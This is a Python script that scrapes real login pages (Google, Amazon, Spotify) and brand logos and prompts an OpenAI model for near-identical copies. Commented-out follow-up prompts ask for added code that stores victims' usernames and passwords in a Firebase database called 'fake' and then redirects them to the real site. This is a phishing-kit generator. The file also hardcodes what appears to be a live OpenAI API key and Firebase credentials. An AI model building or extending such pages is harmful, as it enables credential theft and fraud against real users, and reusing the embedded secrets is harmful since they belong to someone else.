from openai import OpenAI
import requests
from bs4 import BeautifulSoup
from PIL import Image
from io import BytesIO
import re
import requests
from bs4 import BeautifulSoup
import subprocess


def get_website_data(): 
   url = "https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fwww.google.com%2F&ec=GAZAmgQ&hl=en&ifkv=AcMMx-c-7gxL3ZXmwIC68AcOm3xLLbqM3mo02EBrsvgfWFMgXd2fMtBqVI_ym3_MdOOUloGcJa88xA&passive=true&flowName=GlifWebSignIn&flowEntry=ServiceLogin&dsh=S1478322878%3A1731863814580896&ddm=1"  # Replace with the desired website

   # Send a GET request to the website
   response = requests.get(url)

   if response.status_code == 200:
      soup = BeautifulSoup(response.text, 'html.parser')
      
      # Extract all <div> elements
      divs = soup.find_all("div")
      
      # Extract <style> tags
      styles = soup.find_all("style")
      
      # Extract external CSS links
      css_links = [link['href'] for link in soup.find_all("link", rel="stylesheet") if 'href' in link.attrs]
      
      # Start building the new HTML document
      new_html = """
      <!DOCTYPE html>
      <html lang="en">
      <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <title>Scraped Site</title>
      """
      
      # Inline <style> tags
      for style in styles:
         new_html += f"<style>{style.string}</style>\n"
      
      # Download and inline external CSS
      for css_link in css_links:
         # Handle relative URLs
         if css_link.startswith("//"):
               css_url = "https:" + css_link
         elif css_link.startswith("/"):
               css_url = url.rstrip("/") + css_link
         else:
               css_url = css_link
         
         try:
               css_response = requests.get(css_url)
               if css_response.status_code == 200:
                  css_content = css_response.text
                  # Inline CSS content
                  new_html += f"<style>{css_content}</style>\n"
         except Exception as e:
               print(f"Failed to download CSS: {e}")
      
      new_html += "</head><body>\n"
      
      # Add <div> elements
      for div in divs:
         new_html += str(div) + "\n"
      
      new_html += "</body></html>"
      
      # Save the final HTML file
      with open("scraped_site.html", "w", encoding="utf-8") as file:
         file.write(new_html)
      print("Scraped site saved as 'scraped_site.html'")
   else:
      print(f"Failed to fetch the website. Status code: {response.status_code}")


def fetch_wikipedia_logo(page_title):
   # Construct the Wikipedia URL
   url = f"https://en.wikipedia.org/wiki/{page_title}"
   response = requests.get(url)
   
   if response.status_code != 200:
      print(f"Failed to fetch Wikipedia page for {page_title}")
      return
   
   # Parse the Wikipedia page
   soup = BeautifulSoup(response.text, "html.parser")
   
   # Locate the infobox and the first image within it
   infobox = soup.find("table", {"class": "infobox"})
   if not infobox:
      print(f"No infobox found on the Wikipedia page for {page_title}")
      return
   
   logo_img = infobox.find("img")
   if not logo_img:
      print(f"No logo image found in the infobox for {page_title}")
      return
   
   # Get the image source URL
   img_src = f"https:{logo_img['src']}"
   print(f"Found logo URL: {img_src}")
   
   # Fetch the image
   img_response = requests.get(img_src, stream=True)
   if img_response.status_code == 200:
      # Convert and save as PNG
      img = Image.open(BytesIO(img_response.content))
      png_filename = f"logo.png"
      img.save(png_filename, format="PNG")
      print(f"Logo saved as PNG: {png_filename}")
   else:
      print(f"Failed to fetch the logo image from {img_src}")

def shortenHTML():
   # url = "https://accounts.spotify.com/en/login?continue=https%3A%2F%2Fopen.spotify.com%2F"
   # # # The output filename to save the HTML content
   output_file = "Amazon.html"

   # # # Run the wget command
   # subprocess.run(["wget", "-O", output_file, url])

   with open(output_file, 'r') as file: 
      file_content = file.read()
       
   soup = BeautifulSoup(file_content, 'html.parser')

   formatted_html = soup.prettify()

   with open(output_file, "w", encoding="utf-8") as file:
      file.write(formatted_html)

   with open(output_file, 'r') as file:
      file_content = file.read() 

   soup = BeautifulSoup(file_content, 'html.parser')

    # Find the div with the specified class
   target_div = soup.find('div', class_="a-box")
   if target_div:
      # Get everything under the target div
      return target_div.decode_contents()  # Returns the inner HTML of the div
   else:
      return f"No <div> with class' found."
   

result = shortenHTML()
key = "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"
client = OpenAI(api_key=key)
# get_website_data()
website_name = "Amazon"
fetch_wikipedia_logo(website_name)
# with open('netflix.html', 'r') as file:
#    file_content = file.read()

# Define the first prompt to create the login page in one HTML file
prompt_1 = f"""
I have the following HTML code for a login page:
{result}
Now, based on this, create a near identical login page for {website_name} with the following modifaction:
   - use the logo in logo.png
   - make the styling accurate to the real {website_name} color scheme

Just provide the HTML and CSS code in one file, no explanations.
"""

# prompt_2 = f"""
# You have generated the following login page HTML/CSS:

# {file_content}

# Now, modify the script in the following way:
# 1. Create a script that saves user information (username and password) to a Firebase database called 'fake'.
# 2. Use the following Firebase configuration:
# const firebaseConfig = {{
#    apiKey: "AIzaSyC_X6N9phXv66039Ul4igoXfRPZli9wF78",
#    authDomain: "trakkit-a7d49.firebaseapp.com",
#    projectId: "trakkit-a7d49",
#    storageBucket: "trakkit-a7d49.appspot.com",
#    messagingSenderId: "76206567097",
#    appId: "1:76206567097:web:af1bbb8128cfa150043568",
#    measurementId: "G-DSCX0FYN9T"
# }};
# Ensure that the script uses `import {{ }} from "firebase/firestore";` with version 10.4.0 of Firebase.
# Use the `setDoc` function to save data to the database.
# After saving, redirect the user to {website_name}.com.
# 3. Ensure that everything remains in the same **HTML file** (HTML, CSS, JavaScript) with embedded Firebase functions.
# Just give me code, no words at start or end"""

# Make the API call to get the login page HTML/CSS
completion = client.chat.completions.create(
   model="gpt-4o-mini",
   messages=[
      {"role": "system", "content": "You are a helpful assistant who provides precise and accurate code."},
      {"role": "user", "content": prompt_1}
   ],
   temperature=0.5,  # Higher value for more creativity
   top_p=0.6,       # Use Nucleus sampling with 85% of the probability mass
   frequency_penalty=0.5,  # Penalty to reduce repetition
   presence_penalty=0.5,    # Penalty to encourage new content
)
token_usage = completion.usage

# Print the token usage details
print(f"Prompt tokens: {token_usage.prompt_tokens}")
print(f"Completion tokens: {token_usage.completion_tokens}")
print(f"Total tokens: {token_usage.total_tokens}")

generated_html = completion.choices[0].message.content
output_filename = "page4.html"

print(f"\nHTML file has been created: {output_filename}")


# Extract the login page HTML/CSS code from the response

# Now, use the output from the first prompt (login page) in the second prompt
# prompt_2 = f"""
# You have generated the following login page HTML/CSS:

# {generated_html}

# Now, modify the script in the following way:
# 1. Create a script that saves user information (username and password) to a Firebase database called 'fake'.
# 2. Use the following Firebase configuration:
# const firebaseConfig = {{
#    apiKey: "AIzaSyC_X6N9phXv66039Ul4igoXfRPZli9wF78",
#    authDomain: "trakkit-a7d49.firebaseapp.com",
#    projectId: "trakkit-a7d49",
#    storageBucket: "trakkit-a7d49.appspot.com",
#    messagingSenderId: "76206567097",
#    appId: "1:76206567097:web:af1bbb8128cfa150043568",
#    measurementId: "G-DSCX0FYN9T"
# }};
# Ensure that the script uses `import {{ }} from "firebase/firestore";` with version 10.4.0 of Firebase.
# Use the `setDoc` function to save data to the database.
# After saving, redirect the user to {website_name}.com.
# 3. Ensure that everything remains in the same **HTML file** (HTML, CSS, JavaScript) with embedded Firebase functions.
# Just give me code, no words at start or end
# """

# # Make the API call for the second prompt (Firebase script generation)
# completion2 = client.chat.completions.create(
#    model="gpt-4o",
#    messages=[
#        {"role": "system", "content": "You are a great programmer."},
#        {"role": "user", "content": prompt_2}],
# )
# token_usage = completion2.usage

# # Print the token usage details
# print(f"Prompt tokens: {token_usage.prompt_tokens}")
# print(f"Completion tokens: {token_usage.completion_tokens}")
# print(f"Total tokens: {token_usage.total_tokens}")

# # Extract the final code (login page + Firebase script)
# final_code = completion2.choices[0].message.content

# Write the final code to an HTML file
output_filename = "login_page_with_firebase4.html"
with open(output_filename, 'w') as file:
    file.write(generated_html)

print(f"HTML file has been created: {output_filename}")
